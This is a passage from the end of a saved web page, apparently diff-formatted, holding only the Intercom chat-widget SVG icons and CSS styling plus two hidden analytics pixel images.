3.645v18.404H28V32zm-4.139-11.982a.88.88 0 00-1.292-.105c-.03.026-3.015 2.681-8.57 2.681-5.486 0-8.517-2.636-8.571-2.684a.88.88 0 00-1.29.107 1.01 1.01 0 00-.219.708.992.992 0 00.318.664c.142.128 3.537 3.15 9.762 3.15 6.226 0 9.621-3.022 9.763-3.15a.992.992 0 00.317-.664 1.01 1.01 0 00-.218-.707z"></path></svg></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg viewBox="0 0 16 14" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M.116 4.884l1.768-1.768L8 9.232l6.116-6.116 1.768 1.768L8 12.768.116 4.884z"></path></svg></div></div><style id="intercom-lightweight-app-style" type="text/css">
+  @keyframes intercom-lightweight-app-launcher {
+    from {
+      opacity: 0;
+      transform: scale(0.5);
+    }
+    to {
+      opacity: 1;
+      transform: scale(1);
+    }
+  }
+
+  @keyframes intercom-lightweight-app-gradient {
+    from {
+      opacity: 0;
+    }
+    to {
+      opacity: 1;
+    }
+  }
+
+  @keyframes intercom-lightweight-app-messenger {
+    from {
+      opacity: 0;
+      transform: translateY(20px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .intercom-lightweight-app {
+    position: fixed;
+    z-index: 2147483001;
+    width: 0;
+    height: 0;
+    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
+  }
+
+  .intercom-lightweight-app-gradient {
+    position: fixed;
+    z-index: 2147483002;
+    width: 500px;
+    height: 500px;
+    bottom: 0;
+    right: 0;
+    pointer-events: none;
+    background: radial-gradient(
+      ellipse at bottom right,
+      rgba(29, 39, 54, 0.16) 0%,
+      rgba(29, 39, 54, 0) 72%);
+    animation: intercom-lightweight-app-gradient 200ms ease-out;
+  }
+
+  .intercom-lightweight-app-launcher {
+    position: fixed;
+    z-index: 2147483003;
+    bottom: 20px;
+    right: 20px;
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    background: #85C700;
+    cursor: pointer;
+    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
+    animation: intercom-lightweight-app-launcher 250ms ease;
+  }
+
+  .intercom-lightweight-app-launcher:focus {
+    outline: none;
+    
+  }
+
+  .intercom-lightweight-app-launcher-icon {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    position: absolute;
+    top: 0;
+    left: 0;
+    width: 60px;
+    height: 60px;
+    transition: transform 100ms linear, opacity 80ms linear;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg {
+    width: 28px;
+    height: 32px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-open svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve {
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg {
+    height: 56px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-self-serve svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-launcher-custom-icon-open {
+    max-height: 36px;
+    max-width: 36px;
+    
+        opacity: 1;
+        transform: rotate(0deg) scale(1);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize {
+    
+        opacity: 0;
+        transform: rotate(-60deg) scale(0);
+      
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg {
+    width: 16px;
+  }
+
+  .intercom-lightweight-app-launcher-icon-minimize svg path {
+    fill: rgb(255, 255, 255);
+  }
+
+  .intercom-lightweight-app-messenger {
+    position: fixed;
+    z-index: 2147483003;
+    overflow: hidden;
+    background-color: white;
+    animation: intercom-lightweight-app-messenger 250ms ease-out;
+    
+        width: 376px;
+        height: calc(100% - 120px);
+        max-height: 704px;
+        min-height: 250px;
+        right: 20px;
+        bottom: 100px;
+        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
+        border-radius: 8px;
+      
+  }
+
+  .intercom-lightweight-app-messenger-header {
+    height: 75px;
+    background: linear-gradient(
+      135deg,
+      rgb(17, 25, 39) 0%,
+      rgb(0, 0, 0) 100%
+    );
+  }
+
+  @media print {
+    .intercom-lightweight-app {
+      display: none;
+    }
+  }
+</style></div><img src="./File Inclusion5_files/adsct" height="1" width="1" style="display: none;"><img src="./File Inclusion5_files/adsct(1)" height="1" width="1" style="display: none;"></body></html>
